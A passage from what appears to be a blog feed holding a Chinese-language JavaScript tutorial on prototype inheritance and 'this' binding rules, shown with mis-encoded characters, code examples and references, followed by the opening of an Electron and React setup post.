<span class="string">'123'</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-ç±»ç»§æ‰¿-vs-åŸå‹ç»§æ‰¿"><a href="#3-ç±»ç»§æ‰¿-vs-åŸå‹ç»§æ‰¿" class="headerlink" title="3. ç±»ç»§æ‰¿ vs åŸå‹ç»§æ‰¿"></a>3. ç±»ç»§æ‰¿ vs åŸå‹ç»§æ‰¿</h3><p>åŸå‹ç»§æ‰¿çš„ç»§æ‰¿é“¾æ˜¯ç”±å®å®åœ¨åœ¨çš„å¯¹è±¡æ„æˆçš„ã€‚<br>è€Œç±»ç»§æ‰¿ç³»ç»Ÿæ˜¯é€šè¿‡æŠ½è±¡çš„ç±»å®šä¹‰ï¼ˆclassï¼‰æ¥è¿›è¡Œç»§æ‰¿ã€‚</p><p>åœ¨å®é™…åº”ç”¨ä¸­ï¼ŒåŸå‹ç»§æ‰¿çš„ä¸€ä¸ªæœ€å¤§ç‰¹æ€§å°±æ˜¯çµæ´»ï¼Œå› ä¸ºç»§æ‰¿é“¾ä¸Šçš„æ¯ä¸€ä¸ªå¯¹è±¡ã€ç”šè‡³ç»§æ‰¿é“¾æœ¬èº«éƒ½æ˜¯å¯ä»¥åŠ¨æ€ä¿®æ”¹çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œç±»ç»§æ‰¿éœ€è¦äº‹å…ˆå®šä¹‰å¥½æ‰€æœ‰çš„ç±»å’Œå®ƒä»¬ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ï¼Œç»å¤§éƒ¨åˆ†ç±»ç»§æ‰¿ç³»ç»Ÿéƒ½ä¸æ”¯æŒåœ¨è¿è¡Œæ—¶åŠ¨æ€ä¿®æ”¹è¿™äº›å·²ç»å®šä¹‰å¥½çš„ä¸œè¥¿ã€‚æœ‰äº›äº‹æƒ…åœ¨ç±»ç»§æ‰¿ç³»ç»Ÿé‡Œæ˜¯åšä¸åˆ°ï¼ˆæˆ–å¾ˆéš¾åšåˆ°ï¼‰çš„ï¼Œæ¯”å¦‚ä¿®æ”¹åŸå‹ç­‰äºåŒæ—¶ä¿®æ”¹äº†æ‰€æœ‰ç»§æ‰¿è‡ªè¯¥åŸå‹çš„å¯¹è±¡ï¼Œå°†ä¸€ä¸ªåŸå‹çš„å±æ€§éƒ¨åˆ†æ··å…¥å¦ä¸€ä¸ªåŸå‹ï¼Œç”šè‡³æ˜¯åœ¨ç°æœ‰çš„ç»§æ‰¿é“¾ä¸­æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç­‰ç­‰ã€‚</p><p><br></p><h3 id="4-this"><a href="#4-this" class="headerlink" title="4. this"></a>4. this</h3><p>åœ¨å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ï¼Œ<code>this</code>çš„å€¼æŒ‡å‘å…¨å±€å¯¹è±¡ã€‚åœ¨å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ï¼Œ<code>this</code>çš„å€¼å–å†³äºè¯¥å‡½æ•°æ˜¯å¦‚ä½•åˆ«è°ƒç”¨çš„ã€‚å¦‚æœå®ƒè¢«ä¸€ä¸ªå¼•ç”¨å¯¹è±¡è°ƒç”¨ï¼Œé‚£ä¹ˆ<code>this</code>ä¼šè¢«è®¾ç½®æˆé‚£ä¸ªå¯¹è±¡ï¼Œå¦åˆ™<code>this</code>çš„å€¼åˆ«è®¾ç½®ä¸ºå…¨å±€å¯¹è±¡æˆ–<code>undefined</code>(ä¸¥æ ¼æ¨¡å¼ä¸‹)</p><p><em><code>this</code></em>æœ¬èº«æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘è°ƒç”¨å‡½æ•°çš„å¯¹è±¡ã€‚å¦‚ä½•å‡†ç¡®åˆ¤æ–­thisæŒ‡å‘çš„æ˜¯ä»€ä¹ˆï¼Ÿ<em>thisæ°¸è¿œæŒ‡å‘æœ€åè°ƒç”¨å®ƒçš„é‚£ä¸ªå¯¹è±¡</em>ã€‚</p><p><br></p><h4 id="2-1-é»˜è®¤ç»‘å®š"><a href="#2-1-é»˜è®¤ç»‘å®š" class="headerlink" title="2.1 é»˜è®¤ç»‘å®š"></a>2.1 é»˜è®¤ç»‘å®š</h4><p>é»˜è®¤ç»‘å®šï¼Œåœ¨ä¸èƒ½åº”ç”¨å…¶ä»–ç»‘å®šè§„åˆ™æ—¶ä½¿ç”¨çš„é»˜è®¤è§„åˆ™ï¼Œé€šå¸¸æ˜¯ç‹¬ç«‹å‡½æ•°è°ƒç”¨ã€‚</p><p>åœ¨è°ƒç”¨<code>a()</code>æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œäº†<code>window.a()</code>ï¼Œè¿™ä¸ªæ—¶å€™<code>this</code>æŒ‡å‘<code>windowå¯¹è±¡</code>ã€‚<br>ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œ<code>this</code>æŒ‡å‘undefined, undefinedä¸Šæ²¡æœ‰thiså¯¹è±¡ï¼Œä¼šæŠ›å‡ºé”™è¯¯<code>Uncaught TypeError: Cannot read property &#39;name&#39; of undefined</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Amy'</span></span><br><span class="line">a();  <span class="comment">// æµè§ˆå™¨ä¸‹ hello,Amy</span></span><br><span class="line"><span class="comment">// nodeç¯å¢ƒä¸‹ hello,undefinedã€‚å› ä¸ºnodeä¸­nameå¹¶ä¸æ˜¯æŒ‚åœ¨å…¨å±€å¯¹è±¡ä¸Šçš„</span></span><br></pre></td></tr></table></figure><p>çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œ<code>fn</code>ä»ç„¶æ˜¯è¢«<code>window</code>è°ƒç”¨çš„ï¼Œæ‰€æœ‰<code>this</code>ä»ç„¶æŒ‡å‘<code>window</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"windowsName"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">'Cherry'</span>;</span><br><span class="line">  innerFunction();</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">innerFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);      <span class="comment">// windowsName</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-éšå¼ç»‘å®š"><a href="#2-2-éšå¼ç»‘å®š" class="headerlink" title="2.2 éšå¼ç»‘å®š"></a>2.2 éšå¼ç»‘å®š</h4><p>å‡½æ•°çš„è°ƒç”¨æ˜¯åœ¨æŸä¸ªå¯¹è±¡ä¸Šè§¦å‘çš„ï¼Œå…¸å‹å½¢å¼ä¸º<em><code>XXX.fun()</code></em>ï¼Œ è°ƒç”¨ä½ç½®ä¸Šå­˜åœ¨ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚</p><p>sayHiå‡½æ•°å£°æ˜åœ¨å¤–éƒ¨ï¼Œä¸¥æ ¼æ¥è¯´ä¸å±äºpersonï¼Œ ä½†åœ¨è°ƒç”¨sayHiæ—¶ï¼Œè°ƒç”¨ä½ç½®ä¼šä½¿ç”¨personçš„ä¸Šä¸‹æ–‡æ¥å¼•ç”¨å‡½æ•°ï¼Œéšå¼ç»‘å®šä¼šæŠŠå‡½æ•°è°ƒç”¨ä¸­çš„thisç»‘å®šåˆ°è¿™ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ã€‚ï¼ˆæ³¨æ„ï¼Œä¸ç®¡æœ‰å¤šå°‘å±‚è°ƒç”¨ï¼Œåªæœ‰æœ€åä¸€å±‚ä¼šç¡®å®šthisæŒ‡å‘çš„æ˜¯ä»€ä¹ˆï¼‰<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'Sarah'</span>,</span><br><span class="line">  friend: person2,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span></span><br><span class="line">person1.friend.sayHi()  <span class="comment">// Hi,Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><em>éšå¼ç»‘å®šä¸¢å¤±</em><br>Hiç›´æ¥æŒ‡å‘äº†sayHiçš„å¼•ç”¨ï¼Œåœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œè·Ÿpersonæ²¡æœ‰å…³ç³»ã€‚<em><code>XXX.fn()</code></em>å¦‚æœ<code>fn()</code>å‰ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé‚£è‚¯å®šä¸æ˜¯éšå¼ç»‘å®šï¼Œä½†ä¹Ÿä¸ä¸€å®šå°±æ˜¯é»˜è®¤ç»‘å®šã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = person.sayHi;</span><br><span class="line">Hi();   <span class="comment">// Hello,Mike</span></span><br></pre></td></tr></table></figure></p><p>åœ¨<strong>å›è°ƒå‡½æ•°</strong>ä¸­ï¼Œä¹Ÿä¼šå­˜åœ¨éšå¼ç»‘å®šä¸¢å¤±ã€‚</p><ul><li>ç¬¬ä¸€æ¡è¾“å‡ºä¸­ï¼Œ<code>setTimeout</code>çš„å›è°ƒå‡½æ•°ä¸­ï¼Œthisä½¿ç”¨çš„æ˜¯é»˜è®¤ç»‘å®šï¼Œéä¸¥æ ¼æ¨¡å¼ä¸‹ï¼ŒthisæŒ‡å‘å…¨å±€å¯¹è±¡</li><li>ç¬¬äºŒæ¡è¾“å‡ºä¸­ï¼Œ<code>setTimeout(fn, delay){ fn() }</code>ï¼Œç›¸å½“äºå°†<code>person2.sayHi</code>èµ‹å€¼ç»™äº†ä¸€ä¸ªå˜é‡ï¼Œæœ€åæ‰§è¡Œäº†è¿™ä¸ªå˜é‡ï¼Œå› æ­¤sayHiä¸­çš„thiså’Œperson2å°±æ²¡æœ‰å…³ç³»äº†ã€‚</li><li>ç¬¬ä¸‰æ¡è¾“å‡ºä¸­ï¼Œæ‰§è¡Œçš„æ˜¯<code>person2.sayHi()</code>ï¼Œæ‰€ä»¥thisæŒ‡å‘person2ã€‚<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  name: <span class="string">'Sarah'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line">person1.sayHi();                <span class="comment">// hello,Mike</span></span><br><span class="line">setTimeout(person2,sayHi, <span class="number">100</span>); <span class="comment">// hello,Mike</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  person2.sayHi()</span><br><span class="line">&#125;, <span class="number">200</span>)                         <span class="comment">// hello,Sarah</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-3-æ˜¾å¼ç»‘å®š"><a href="#2-3-æ˜¾å¼ç»‘å®š" class="headerlink" title="2.3 æ˜¾å¼ç»‘å®š"></a>2.3 æ˜¾å¼ç»‘å®š</h4><p>é€šè¿‡<code>call</code>, <code>apply</code>, <code>bind</code>çš„æ–¹å¼ï¼Œæ˜¾ç¤ºçš„æŒ‡å®šthisçš„å€¼ã€‚call,apply,bindçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°±æ˜¯æŒ‡å®šthisæ‰€æŒ‡å‘çš„å¯¹è±¡ã€‚callå’Œapplyçš„ä½œç”¨ä¸€æ ·ï¼Œåªæ˜¯ä¼ å‚æ–¹å¼ä¸åŒã€‚callå’Œapplyéƒ½ä¼šæ‰§è¡Œå¯¹åº”çš„å‡½æ•°ï¼Œè€Œbindæ–¹æ³•ä¸ä¼šã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = person.sayHi;</span><br><span class="line">Hi.call(person);     <span class="comment">// hello,Amy</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><em>æ˜¾å¼ç»‘å®šä¸¢å¤±</em><br><code>Hi.call(person, person.sayHi)</code>çš„ç¡®å°†thisç»‘å®šåˆ°Hiä¸­çš„thisã€‚ä½†åœ¨æ‰§è¡Œfnçš„æ—¶å€™ï¼Œç›¸å½“äºç›´æ¥è°ƒç”¨äº†sayHiæ–¹æ³•ï¼ˆæ²¡æœ‰æ˜¾å¼æ¿é¡¶ï¼Œ person.sayHiå·²ç»èµ‹å€¼ç»™fn, éšå¼ç»‘å®šä¹Ÿä¸¢å¤±äº†ï¼‰ã€‚å› æ­¤å¯¹åº”çš„æ˜¯é»˜è®¤ç»‘å®šã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello,'</span>, <span class="keyword">this</span>.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  name: <span class="string">'Amy'</span>,</span><br><span class="line">  sayHi: sayHi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mike'</span>;</span><br><span class="line"><span class="keyword">var</span> Hi = fucntion(fn) &#123;</span><br><span class="line">  fn();           <span class="comment">// wrong: hello,Mike</span></span><br><span class="line">  fn.call(<span class="keyword">this</span>);  <span class="comment">// true:  hello,Amy</span></span><br><span class="line">&#125;</span><br><span class="line">Hi.call(person, person.sayHi);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-newç»‘å®š"><a href="#2-4-newç»‘å®š" class="headerlink" title="2.4 newç»‘å®š"></a>2.4 newç»‘å®š</h4><p>åœ¨javascriptä¸­ï¼Œæ„é€ å‡½æ•°åªæ˜¯ä½¿ç”¨newæ“ä½œç¬¦æ—¶è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å’Œæ™®é€šçš„å‡½æ•°å¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒï¼Œå®ƒä¸å±äºæŸä¸ªç±»ï¼Œä¹Ÿä¸å¯èƒ½å®ä¾‹å®ä¾‹å‡ºä¸€ä¸ªç±»ã€‚ä»»ä½•ä¸€ä¸ªå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨newæ¥è°ƒç”¨ï¼Œå› æ­¤å…¶å®å¹¶ä¸å­˜åœ¨æ„é€ å‡½æ•°ï¼Œè€Œåªæœ‰å¯¹äºå‡½æ•°çš„â€œæ„é€ è°ƒç”¨â€ã€‚</p><p>ä½¿ç”¨newæ¥è°ƒç”¨å‡½æ•°ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œä¸‹é¢çš„æ“ä½œï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡</li><li>å°†æ„é€ å‡½æ•°çš„ä½œç”¨åŸŸå¤åˆ¶ç»™æ–°å¯¹è±¡ï¼Œå³thisæŒ‡å‘è¿™ä¸ªæ–°å¯¹è±¡</li><li>æ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„ä»£ç </li><li>è¿”å›æ–°å¯¹è±¡</li></ul><p>å› æ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨newæ¥è°ƒç”¨å‡½æ•°çš„æ—¶å€™ï¼Œæ–°å¯¹è±¡ä¼šç»‘å®šåˆ°è¿™ä¸ªå‡½æ•°çš„thisä¸Šã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHi</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Hi = <span class="keyword">new</span> sayHi(<span class="string">'Amy'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(Hi.name);   <span class="comment">// Amy</span></span><br></pre></td></tr></table></figure></p><h3 id="4-ç®­å¤´å‡½æ•°-å’Œ-æ™®é€šå‡½æ•°çš„åŒºåˆ«"><a href="#4-ç®­å¤´å‡½æ•°-å’Œ-æ™®é€šå‡½æ•°çš„åŒºåˆ«" class="headerlink" title="4. ç®­å¤´å‡½æ•° å’Œ æ™®é€šå‡½æ•°çš„åŒºåˆ«"></a>4. ç®­å¤´å‡½æ•° å’Œ æ™®é€šå‡½æ•°çš„åŒºåˆ«</h3><p>ä¼˜å…ˆçº§: newç»‘å®š &gt; æ˜¾å¼ç»‘å®š &gt; éšå¼ç»‘å®š &gt; é»˜è®¤ç»‘å®š</p><h4 id="3-2-ç»‘å®šnull-undefined"><a href="#3-2-ç»‘å®šnull-undefined" class="headerlink" title="3.2 ç»‘å®šnull,undefined"></a>3.2 ç»‘å®šnull,undefined</h4><p>å°†null, undefinedä½œä¸ºthisçš„ç»‘å®šå¯¹è±¡ä¼ å…¥call, apply, bindï¼Œè¿™äº›å€¼åœ¨è°ƒç”¨æ—¶ä¼šè¢«å¿½ç•¥ï¼Œå®é™…åº”ç”¨çš„æ˜¯é»˜è®¤ç»‘å®šè§„åˆ™</p><h4 id="3-3-ç®­å¤´å‡½æ•°"><a href="#3-3-ç®­å¤´å‡½æ•°" class="headerlink" title="3.3 ç®­å¤´å‡½æ•°"></a>3.3 ç®­å¤´å‡½æ•°</h4><p>ç®­å¤´å‡½æ•°çš„ this å§‹ç»ˆæŒ‡å‘å‡½æ•°å®šä¹‰æ—¶çš„ thisï¼Œè€Œéæ‰§è¡Œæ—¶ã€‚<br>ç®­å¤´å‡½æ•°ä¸­æ²¡æœ‰ this ç»‘å®šï¼Œå¿…é¡»é€šè¿‡æŸ¥æ‰¾ä½œç”¨åŸŸé“¾æ¥å†³å®šå…¶å€¼ã€‚<br>ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„thisï¼Œå› æ­¤ä¸èƒ½ç”¨call, apply, bindè¿™äº›æ–¹æ³•å»æ”¹å˜thisçš„æ‰§è¡Œã€‚å®ƒçš„thisç»§æ‰¿äºå¤–å±‚ä»£ç åº“ä¸­çš„thisã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  number: <span class="number">3</span>,</span><br><span class="line">  fn: (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> number;</span><br><span class="line">    <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">    number = number * <span class="number">2</span>;</span><br><span class="line">    number = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> num = <span class="keyword">this</span>.number;</span><br><span class="line">      <span class="keyword">this</span>.number *= <span class="number">2</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(num);</span><br><span class="line">      number *= <span class="number">3</span>;</span><br><span class="line">      <span class="built_in">console</span>.log(number)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myFun = obj.fn;    </span><br><span class="line">myFun.call(<span class="literal">null</span>);   <span class="comment">// 10, 9</span></span><br><span class="line">obj.fn();           <span class="comment">// 3, 27</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.number)  <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10, 9, 3, 27, 20</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/6991483397495324703?share_token=22e1f417-433c-45b5-af4a-36379e2a189a" target="_blank" rel="noopener">è¯´è¯´newæ“ä½œç¬¦å…·ä½“å¹²äº†ä»€ä¹ˆï¼Ÿ</a></li><li><a href="https://www.zhihu.com/question/21740084/answer/24886476" target="_blank" rel="noopener">åŸºäºç±»çš„ç»§æ‰¿å’ŒåŸºäºåŸå‹çš„ç»§æ‰¿ç›¸æ¯”è¾ƒï¼Œå„æœ‰ä»€ä¹ˆä¼˜åŠ£ï¼Ÿä¸ºä»€ä¹ˆå¾ˆå°‘æœ‰è¯­è¨€æ˜¯ç”¨åŸºäºåŸå‹çš„ç»§æ‰¿ï¼Ÿ</a></li><li><a href="https://github.com/YvetteLau/Blog/issues/6" target="_blank" rel="noopener">å—¨ï¼Œä½ çœŸçš„æ‡‚thiså—ï¼Ÿ</a></li><li><a href="https://react.docschina.org/docs/faq-functions.html" target="_blank" rel="noopener">åœ¨ç»„ä»¶ä¸­ä½¿ç”¨äº‹ä»¶å¤„ç†å‡½æ•°</a></li><li><a href="https://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/" target="_blank" rel="noopener">Understanding JavaScript Function Invocation and â€œthisâ€</a></li><li><a href="https://juejin.im/post/5ba32171f265da0ab719a6d7" target="_blank" rel="noopener">ç†è§£ JavaScript ä¸­çš„æ‰§è¡Œä¸Šä¸‹æ–‡å’Œæ‰§è¡Œæ ˆ</a></li><li><a href="https://juejin.im/post/5b684f30f265da0f9f4e87cf" target="_blank" rel="noopener">javascript åƒåœ¾å›æ”¶æœºåˆ¶</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures" target="_blank" rel="noopener">é—­åŒ…</a></li><li><a href="http://www.ruanyifeng.com/blog/2013/01/javascript_strict_mode.html" target="_blank" rel="noopener">Javascriptä¸¥æ ¼æ¨¡å¼è¯¦è§£</a></li><li><a href="https://juejin.cn/post/6844903496253177863" target="_blank" rel="noopener">thisã€applyã€callã€bind</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Electron + creact-react-app + ant-designæ­å»ºé¡¹ç›®</title>
      <link href="/2019/08/05/electron%E6%90%AD%E5%BB%BAReact-app/"/>
      <url>/2019/08/05/electron%E6%90%AD%E5%BB%BAReact-app/</url>
      <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> Electronå¯ä»¥ç®€å•åœ°ç†è§£ä¸º</span><br><span class="line">Electron = nodejs + chromeå†…æ ¸</span><br></pre></td></tr></table></figure><p>å› ä¸ºå†…ç½®chromeå†…æ ¸ï¼Œæ‰€ä»¥å¼€å‘è€…å¯ä»¥ç”¨html/css/jsæ¥æ„å»ºé¡µé¢ï¼Œè¿™ä¸€éƒ¨åˆ†è¿è¡Œåœ¨<em>æ¸²æŸ“è¿›ç¨‹</em>ä¸­ã€‚<br>å› ä¸ºå†…ç½®nodejsç¯å¢ƒï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®è®¡ç®—æœºæœ¬åœ°çš„èµ„æºï¼šè¯»å†™ç£ç›˜æ–‡ä»¶ã€åˆ›å»ºè¿›ç¨‹ã€æœ¬åœ°é€šçŸ¥ï¼Œè¿™ä¸€éƒ¨åˆ†è¿è¡Œåœ¨<em>ä¸»è¿›ç¨‹</em>ä¸­ã€‚</p><p><br></p><h3 id="1-æ­å»ºåº”ç”¨"><a href="#1-æ­å»ºåº”ç”¨" class="headerlink" title="1. æ­å»ºåº”ç”¨"></a>1. æ­å»ºåº”ç”¨</h3><p>ç›®æ 